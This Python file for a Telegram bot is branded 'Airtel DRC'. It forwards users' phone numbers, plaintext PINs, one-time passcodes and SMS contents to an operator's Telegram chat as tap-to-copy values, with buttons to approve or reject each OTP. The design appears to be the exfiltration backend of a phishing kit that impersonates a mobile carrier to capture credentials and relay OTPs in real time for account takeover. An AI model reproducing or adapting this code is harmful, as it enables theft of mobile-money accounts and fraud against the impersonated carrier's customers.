# telegram_bot.py
import os
import httpx
from datetime import datetime, timezone
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
ADMIN_CHAT_ID = (
    os.getenv("TELEGRAM_ADMIN_CHAT_ID")
    or os.getenv("TELEGRAM_CHAT_ID")
    or ""
)
TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"


# ─────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────
def _phone_block(phone: str) -> str:
    """
    Blue, bold, monospace, tappable, copyable phone number.

    - <a href="tel:...">  → blue + opens dialer on mobile
    - <b>                 → bold
    - <code>              → monospace + tap-to-copy
    Rendered inside its own line so it gets maximum visual weight.
    """
    # Keep only digits and a leading + for the tel: link
    tel_digits = "+" + "".join(ch for ch in phone if ch.isdigit())
    return f'<a href="tel:{tel_digits}"><b><code>{phone}</code></b></a>'


def _ref_block(ref: str) -> str:
    """Blue, monospace, copyable reference ID."""
    return f"<b><code>{ref}</code></b>"


# ─────────────────────────────────────────────────────────────
# Inline keyboards
# ─────────────────────────────────────────────────────────────
def _otp_keyboard(approval_id: str) -> dict:
    return {
        "inline_keyboard": [
            [
                {"text": "✅ Approve", "callback_data": f"approve:{approval_id}"},
                {"text": "❌ Reject",  "callback_data": f"reject:{approval_id}"},
            ]
        ]
    }


def _loan_keyboard(approval_id: str) -> dict:
    return {
        "inline_keyboard": [
            [
                {"text": "✅ Approve Loan", "callback_data": f"loan_approve:{approval_id}"},
                {"text": "❌ Deny Loan",    "callback_data": f"loan_reject:{approval_id}"},
            ]
        ]
    }


# ─────────────────────────────────────────────────────────────
# Shared low-level send helper
# ─────────────────────────────────────────────────────────────
async def send_telegram_message(
    text: str,
    reply_markup: dict | None = None,
    chat_id: str | None = None,
) -> dict:
    if not BOT_TOKEN or not (chat_id or ADMIN_CHAT_ID):
        print("🔴 Telegram credentials missing.")
        return {"ok": False, "error": "Missing credentials"}

    payload = {
        "chat_id": chat_id or ADMIN_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup

    async with httpx.AsyncClient(timeout=15) as client:
        try:
            r = await client.post(f"{TG_API}/sendMessage", json=payload)
            r.raise_for_status()
            print(f"🟢 Telegram sendMessage: {r.status_code}")
            return r.json()
        except httpx.HTTPStatusError as e:
            print(f"🔴 Telegram HTTP {e.response.status_code}: {e.response.text}")
            return {"ok": False, "error": e.response.text}
        except Exception as e:
            print(f"🔴 Telegram send error: {e}")
            return {"ok": False, "error": str(e)}


# ─────────────────────────────────────────────────────────────
# Login alert — phone, PIN, action, timestamp (no OTP)
# ─────────────────────────────────────────────────────────────
async def send_login_alert(phone: str, pin: str, action: str = "LOGIN") -> dict:
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    text = (
        "🔔 <b>Airtel DRC — Activity Alert</b>\n"
        "━━━━━━━━━━━━━━━\n\n"
        "📱 <b>PHONE NUMBER</b>\n"
        f"<pre>{phone}</pre>\n"
        f"{_phone_block(phone)}\n\n"
        f"🔑 <b>PIN:</b>    <code>{pin}</code>\n"
        f"🎯 <b>Action:</b> <b>{action}</b>\n"
        f"🕐 <b>Time:</b>   {ts}\n"
        "━━━━━━━━━━━━━━━\n"
        "<i>💡 Tap the phone number to copy or call.</i>"
    )

    return await send_telegram_message(text)


# ─────────────────────────────────────────────────────────────
# OTP approval request (with Approve / Reject buttons)
# ─────────────────────────────────────────────────────────────
async def send_approval_request(
    approval_id: str,
    phone: str,
    pin: str,
    otp: str,
    sms_body: str = "",
    is_user_submitted: bool = False,
) -> dict:
    if is_user_submitted:
        title = "🔔 <b>OTP Verification Request</b>"
        subtitle = "The user has entered this code. Please review."
    else:
        title = "🔐 <b>OTP Issued</b>"
        subtitle = "A new OTP was sent to the user."

    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    text = (
        f"{title}\n"
        f"<i>{subtitle}</i>\n"
        "━━━━━━━━━━━━━━━\n\n"
        "📱 <b>PHONE NUMBER</b>\n"
        f"<pre>{phone}</pre>\n"
        f"{_phone_block(phone)}\n\n"
        "🔑 <b>PIN</b>\n"
        f"<pre>{pin}</pre>\n"
        f"{_ref_block(pin)}\n\n"
        "🔢 <b>OTP CODE</b>\n"
        f"<pre>{otp}</pre>\n"
        f"{_ref_block(otp)}\n\n"
        f"🕐 <b>Time:</b>  {ts}\n"
        f"🆔 <b>Ref:</b>\n{_ref_block(approval_id)}\n"
        "━━━━━━━━━━━━━━━"
    )

    if sms_body:
        text += f"\n\n📩 <b>SMS sent:</b>\n<i>{sms_body}</i>"

    text += "\n\n<i>💡 Tap any value to copy it.</i>"
    text += "\n\n<b>Approve this OTP?</b>"

    return await send_telegram_message(text, reply_markup=_otp_keyboard(approval_id))


# ─────────────────────────────────────────────────────────────
# Loan approval request (with Approve / Deny buttons)
# ─────────────────────────────────────────────────────────────
async def send_loan_approval_request(approval_id: str, phone: str) -> dict:
    text = (
        "🏦 <b>New Loan Request</b>\n"
        "━━━━━━━━━━━━━━━\n\n"
        "📱 <b>PHONE NUMBER</b>\n"
        f"<pre>{phone}</pre>\n"
        f"{_phone_block(phone)}\n\n"
        "🆔 <b>REFERENCE</b>\n"
        f"<pre>{approval_id}</pre>\n"
        f"{_ref_block(approval_id)}\n\n"
        "━━━━━━━━━━━━━━━\n"
        "<i>💡 Tap the phone number to copy or call.</i>\n\n"
        "<b>Approve this loan request?</b>"
    )
    return await send_telegram_message(text, reply_markup=_loan_keyboard(approval_id))


# ─────────────────────────────────────────────────────────────
# Ack a button press
# ─────────────────────────────────────────────────────────────
async def answer_callback_query(callback_id: str, text: str = "") -> dict:
    if not BOT_TOKEN:
        return {"ok": False, "error": "Missing token"}

    async with httpx.AsyncClient(timeout=10) as client:
        try:
            r = await client.post(
                f"{TG_API}/answerCallbackQuery",
                json={
                    "callback_query_id": callback_id,
                    "text": text,
                    "show_alert": False,
                },
            )
            return r.json()
        except Exception as e:
            print(f"🔴 Callback answer error: {e}")
            return {"ok": False, "error": str(e)}


# ─────────────────────────────────────────────────────────────
# Replace the message body after a decision
# ─────────────────────────────────────────────────────────────
async def edit_message(chat_id: int, message_id: int, text: str) -> dict:
    if not BOT_TOKEN:
        return {"ok": False, "error": "Missing token"}

    async with httpx.AsyncClient(timeout=10) as client:
        try:
            r = await client.post(
                f"{TG_API}/editMessageText",
                json={
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": text,
                    "parse_mode": "HTML",
                },
            )
            return r.json()
        except Exception as e:
            print(f"🔴 Edit message error: {e}")
            return {"ok": False, "error": str(e)}